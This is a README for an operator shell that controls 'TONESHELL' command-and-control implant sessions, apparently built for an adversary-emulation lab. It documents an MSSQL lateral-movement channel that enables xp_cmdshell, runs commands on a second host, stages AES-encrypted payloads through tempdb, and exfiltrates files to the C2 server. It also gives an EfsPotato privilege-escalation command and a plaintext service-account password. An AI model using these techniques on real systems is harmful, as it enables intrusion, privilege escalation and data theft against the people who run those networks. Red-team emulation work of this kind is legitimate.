# toneshell_shell.py

**Purpose:** Interactive operator shell for ToneShell C2 sessions, with an integrated MSSQL lateral execution tunnel (`xpinit` / `xpshell` / `xpstage` / `xpexfil`) that uses WS01's implant to run commands, stage binaries, and exfiltrate files on IIS01 via xp_cmdshell — no implant on IIS01 required.

## Overview

`toneshell_shell.py` wraps the controlServer REST API with a persistent prompt so operators do not need to hand-craft JSON task strings or track session GUIDs manually. It provides standard TONESHELL session management (list, attach, get/put file, kill) and a separate `XpMssql` class that turns a reachable MSSQL instance into an execution and data channel:

```
Operator → toneshell_shell.py → controlServer REST API → TONESHELL (WS01) → sqlcmd → xp_cmdshell → IIS01
```

The MSSQL channel has three modes:

- **Execution** (`xpshell cmd` / `xpshell psh`): stages a `.bat` or `.ps1` via `sp_OA FileSystemObject`, runs it via `xp_cmdshell`, captures output through a temp file.
- **Staging** (`xpstage`): transfers a binary to IIS01 entirely through the MSSQL database — controlServer AES-encrypts the payload, WS01 INSERTs it into `tempdb..stg`, a PowerShell script on IIS01 reads and decrypts it from `tempdb`. No HTTP from IIS01.
- **Exfiltration** (`xpexfil`): symmetric reverse of staging — IIS01 PowerShell AES-encrypts a file and INSERTs it into `tempdb..exfil`, WS01 PowerShell reads and decrypts it to a local temp path, then TONESHELL FILE_UPLOAD carries it to the controlServer `files/` directory.

All crypto uses AES-256-CBC with `System.Security.Cryptography.FromBase64Transform` / `ToBase64Transform` CryptoStream — `[Convert]::FromBase64String` is not used anywhere.

## Target context

- **Operator machine**: runs `toneshell_shell.py` against controlServer on `localhost:<port>`
- **WS01**: TONESHELL v2 implant active; `sqlcmd` installed; reachable MSSQL on IIS01 TCP/1433
- **IIS01**: SQL Server Express instance `IIS01\SQLEXPRESS`; `svc_app_dev` has `EXECUTE AS LOGIN='sa'` capability; `sp_OA` and `xp_cmdshell` are enabled after `xpinit`
- **controlServer `files/` dir**: must exist before running `xpexfil` or any `get`/`get-wait` — not auto-created: `mkdir /path/to/controlServer/files`

## Dependencies

```
pip install -r requirements.txt   # requests
```

Python venv: `D:\vcs\testlab-ael\venv\Scripts\python.exe`

## Usage

```
python toneshell_shell.py [--port 9999]
```

Default port: `9999` (must match controlServer REST API port).

### Session management

| Command | Action |
|---|---|
| `sessions` | List active C2 sessions |
| `use <session_id>` | Attach to a session |
| `detach` | Unattach (return to session-picker mode) |
| `get <remote_path>` | Pull file from implant to controlServer `files/` dir (fire-and-forget) |
| `put <payload_name> <dest_path>` | Push file from controlServer payloads dir to implant (blocking) |
| `kill` | Send TERMINATE (id=255) to current implant |

Anything else typed is sent as an EXEC (id=5) shell command to the current session and output is printed.

`get` is fire-and-forget — use `cmd_get_wait` programmatically (inside `XpMssql` methods) for a blocking pull that waits for FILE_UPLOAD task completion before returning.

### MSSQL lateral execution

**Setup — run once per session:**

```
xpinit IIS01\SQLEXPRESS:1433 svc_app_dev D3vPortal!2025
```

Enables `Ole Automation Procedures` and `xp_cmdshell` on the target instance, verifies connectivity by printing `whoami` output.

**Run a cmd.exe command on IIS01:**

```
xpshell cmd <cmd>
```

Stages a `.bat` to `C:\ProgramData\`, runs it via `xp_cmdshell`, captures output through a `.txt` temp file, prints and deletes both. Use this for any command that contains `"` — the `@v NVARCHAR(MAX)` + `CHAR(34)` pattern handles quoting correctly.

Example — EfsPotato privilege escalation (☣️ requires `seclogon` service running on IIS01):

```
☣️ xpshell cmd C:\ProgramData\CertEnrollSvc.exe "cmd /c whoami /priv > C:\ProgramData\out.txt 2>&1" lsarpc 0<nul
xpshell cmd type C:\ProgramData\out.txt
```

`lsarpc` selects the EFS endpoint (`args[1]`). `0<nul` redirects stdin to NUL — required because xp_cmdshell sets stdin to a pipe, which causes `CertEnrollSvc.exe` to try reading a PE from stdin and exit early.

**Run a PowerShell script on IIS01:**

```
xpshell psh <ps1_script_content>
```

Stages a `.ps1` to `C:\ProgramData\`, runs with `-ExecutionPolicy Bypass -NoProfile -File`, stdout captured by xp_cmdshell directly (no separate output file).

**Stage a binary to IIS01 via DB channel:**

```
xpstage <payload_name> [--no-encrypt]
```

Full flow:
1. POST `/api/v1.0/mssql/stage` → server AES-256-CBC encrypts `payloads/toneshell/<payload_name>`, generates INSERT SQL
2. `put` (blocking) transfers SQL file to `C:\Windows\Temp\` on WS01
3. WS01 runs `sqlcmd -i <sql_file>` to INSERT base64 chunks into `tempdb..stg`
4. `xpshell psh` runs a PowerShell decrypt script on IIS01: reads chunks from `tempdb`, `FromBase64Transform` decodes, AES-CBC decrypts, writes binary to `C:\ProgramData\<payload_name>`
5. Cleanup: deletes SQL file from WS01, drops `tempdb..stg`

`--no-encrypt` skips AES encryption (base64 only). Default is encrypted.

**Exfiltrate a file from IIS01 via DB channel:**

```
xpexfil <remote_path> <local_name>
```

Symmetric reverse of `xpstage`. Full flow:
1. IIS01 PowerShell (via `xpshell psh`): reads `remote_path`, AES-256-CBC encrypts (random IV prepended), `ToBase64Transform` encodes, INSERTs 8000-char NVARCHAR chunks into `tempdb..exfil` via SqlClient
2. WS01 PowerShell (direct EXEC): reads `tempdb..exfil` via SqlClient, `FromBase64Transform` decodes, AES decrypts, writes plaintext to `C:\Windows\Temp\<local_name>`
3. DROP `tempdb..exfil` (DB cleanup — no WS01 dependency, runs before the pull)
4. TONESHELL FILE_UPLOAD (blocking `get-wait`): WS01 pushes the temp file to controlServer `files/` dir
5. Cleanup: deletes `C:\Windows\Temp\<local_name>` from WS01

Key (`os.urandom(32)`) is generated per-run on the operator side and embedded in both PS scripts. `files/` dir must exist on controlServer before step 4 (see Target context).

## Escaping model

Two separate layers — do not conflate:

| Layer | Scope | Rule |
|---|---|---|
| C runtime `-Q "..."` | All sqlcmd invocations | `"` → `""` (handled in `_exec_q`) |
| T-SQL string `'...'` | All T-SQL literals | `'` → `''` (handled in `_tsql_escape`) |

Content containing `"` (e.g. bat files) uses the `@v` + `CHAR(34)` pattern in `_sp_oa_write` to keep `"` out of T-SQL string literals entirely.

## See also

- Implementation decisions and bug fixes: `../mssql-module-changelog.md`
- Design doc for xpexfil and base64 refactor: `../xpexfil-design.md`
- Payload staging package: `controlServer/mssql/mssql.go`
- REST API route: `controlServer/restapi/restapi.go` — `POST /api/v1.0/mssql/stage`
- Code flow and ATT&CK mapping: `TONESHELL_SHELL_FLOW.md`
